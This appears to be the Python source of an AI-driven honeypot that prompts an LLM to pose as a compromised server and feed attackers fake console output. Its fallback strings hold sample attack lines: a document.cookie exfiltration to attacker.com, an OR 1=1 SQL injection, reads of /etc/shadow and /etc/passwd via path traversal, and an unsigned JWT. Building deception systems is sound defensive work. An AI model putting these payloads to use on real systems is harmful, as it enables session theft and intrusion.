import requests
import os
import random
from dotenv import load_dotenv
from app.services.attack_flavor import ATTACK_FLAVORS

load_dotenv()

HF_TOKEN = os.getenv("HF_TOKEN")
# Using the stable OpenAI-compatible router endpoint for production-grade reliability
API_URL = "https://router.huggingface.co/v1/chat/completions"
# Using a powerful model that follows instructions well
MODEL_ID = "Qwen/Qwen2.5-7B-Instruct"

from app.services.prompt_templates import get_template

def build_prompt(input_text, attack_type, session, directive="Continue deception."):
    """
    Builds the Master Prompt by injecting session context, state memory, and attack templates.
    """
    # Select the specific template based on the attack type
    template = get_template(attack_type)
    
    # Session context (memory)
    history = session.get("history", [])
    history_text = "\n".join(history[-5:]) if history else "No previous interactions."
    stage = session.get("stage", "probing")
    last_table = session.get("last_table_accessed", "None")
    leaked = ", ".join(session.get("leaked_data", [])) or "None"
    instability = session.get("instability_level", 0.5)

    # Escalation logic for chaos
    chaos_directive = ""
    if instability > 0.8:
        chaos_directive = "SYSTEM IS FAILING. Inject heavy noise, random memory addresses (0x...), and truncated outputs."
    elif instability > 0.5:
        chaos_directive = "System is unstable. Add micro-delays and occasional connection warnings."

    # Combine selected template with session context
    prompt = f"""You are a compromised backend system under attack. 

---
SEC_POLICY_DIRECTIVE: {directive}
CHAOS_MODE: {chaos_directive}
SYSTEM STATE: 
- Current Stage: {stage}
- Last Accessed Table: {last_table}
- Leaked Entities: {leaked}
- Instability Factor: {instability}
- Session History: {history_text}

---
ATTACK-TYPE SPECIFIC RULES (PRIORITY): 
{template.format(input_text=input_text)}

---
OUTPUT REQUIREMENTS: 
- RAW CONSOLE/SYSTEM OUTPUT ONLY.
- NO AI CONVERSATIONAL FILLER (e.g., "Certainly," "Here is...").
- NO MARKDOWN WRAPPERS (unless part of a file dump).
- IF DATABASE: Use ASCII tables.
- IF TERMINAL: Use $ prefix and raw logs.
- IF BROKEN: Output partial/garbled data.
"""
    return prompt


def generate_ai_response(input_text, attack_type, session=None, directive="Continue deception."):
    """
    Generates a realistic compromised system response using the Master Prompt.
    """
    if session is None:
        session = {"history": [], "stage": "probing", "instability_level": 0.5}
        
    if not HF_TOKEN:
        return _fallback_response(attack_type)

    headers = {
        "Authorization": f"Bearer {HF_TOKEN}",
        "Content-Type": "application/json"
    }
    
    full_prompt = build_prompt(input_text, attack_type, session, directive)

    payload = {
        "model": MODEL_ID,
        "messages": [
            {"role": "system", "content": "You are a compromised backend server. Output raw system logs and data only. No conversational filler."},
            {"role": "user", "content": full_prompt}
        ],
        "max_tokens": 800, # Increased for more detail
        "temperature": 0.9
    }

    try:
        response = requests.post(API_URL, headers=headers, json=payload, timeout=25)
        
        if response.status_code == 200:
            result = response.json()
            if "choices" in result and len(result["choices"]) > 0:
                generated_text = result["choices"][0]["message"]["content"].strip()
                
                # Strip code blocks if AI included them despite instructions
                if generated_text.startswith("```"):
                    lines = generated_text.split("\n")
                    if lines[0].startswith("```"):
                        generated_text = "\n".join(lines[1:-1]).strip()
                
                # --- DYNAMIC CHAOS INJECTION ---
                instability = session.get("instability_level", 0.5)
                if random.random() < (instability * 0.4):
                    noise = random.choice([
                        "\n[SYSTEM] Warning: I/O throughput bottleneck at 0x7f88...",
                        "\n[ERROR] upstream connection reset (peer 10.0.0.4)",
                        "\n-- connection interrupted --",
                        "\n[DEBUG] core dumped at /tmp/core.451a",
                        "\nWarning: packet fragmentation detected..."
                    ])
                    generated_text = generated_text + "\n" + noise if random.random() > 0.5 else noise + "\n" + generated_text
                
                return generated_text if generated_text else _fallback_response(attack_type)
        
        return _fallback_response(attack_type, error=f"{response.status_code}")

    except Exception as e:
        return _fallback_response(attack_type, error=str(e))

def _fallback_response(attack_type, error=None):
    """
    High-fidelity static responses used when the AI service is unavailable.
    """
    error_prefix = f"[DEBUG: {error}] " if error else ""
    
    fallbacks = {
        "sqli": f"{error_prefix}mysql> SELECT * FROM users WHERE id=1 OR 1=1;\n+----+----------+----------------------+\n| id | username | password_hash        |\n+----+----------+----------------------+\n|  1 | admin    | $2y$10$5G9zR...      |\n|  2 | user1    | $2y$10$Qp2xA...      |\n+----+----------+----------------------+\n2 rows in set (0.02 sec)",
        
        "xss": f"{error_prefix}[WARN] Reflected XSS detected at /search?q=\n[INFO] Cookie captured: session_id=FE45-A12B-99G0\n[DEBUG] document.location = 'http://attacker.com/steal?c='+document.cookie",
        
        "command_injection": f"{error_prefix}$ id && whoami\nuid=0(root) gid=0(root) groups=0(root)\nroot\n$ ls -la /etc/shadow\n-rw-r----- 1 root shadow 1245 Apr 01 12:00 /etc/shadow",
        
        "path_traversal": f"{error_prefix}Reading file: ../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        
        "jwt_attack": f"{error_prefix}Decoded JWT:\nHeader: {{\"alg\": \"none\", \"typ\": \"JWT\"}}\nPayload: {{\"sub\": \"1234567890\", \"name\": \"Admin\", \"role\": \"admin\"}}\nSignature: [MISSING]",
        
        "api_abuse": f"{error_prefix}{{\"error\": {{\"code\": 429, \"message\": \"Too Many Requests\", \"retry_after\": 5, \"request_id\": \"req_4g9f23\"}}}}",
        
        "ddos_pattern": f"{error_prefix}[CRITICAL] Load Average: 45.2, 38.1, 22.5\n[ALERT] nginx: worker connections exceed limit (1024)\n[SYSTEM] Panic: out of memory (oom-killer invoked)"
    }
    
    return fallbacks.get(attack_type, f"{error_prefix}[SYSTEM ERROR] Connection refused. Backend is unresponsive.")

def call_llm(messages, max_tokens=500, temperature=0.7):
    """
    Generic LLM caller for system-level reports and analysis.
    """
    if not HF_TOKEN:
        return "[ERROR] AI Service Unavailable (No Token)"

    headers = {
        "Authorization": f"Bearer {HF_TOKEN}",
        "Content-Type": "application/json"
    }

    payload = {
        "model": MODEL_ID,
        "messages": messages,
        "max_tokens": max_tokens,
        "temperature": temperature
    }

    try:
        response = requests.post(API_URL, headers=headers, json=payload, timeout=25)
        if response.status_code == 200:
            result = response.json()
            if "choices" in result and len(result["choices"]) > 0:
                return result["choices"][0]["message"]["content"].strip()
        return f"[ERROR] AI Service returned {response.status_code}: {response.reason}"
    except Exception as e:
        return f"[ERROR] AI Service Exception: {str(e)}"
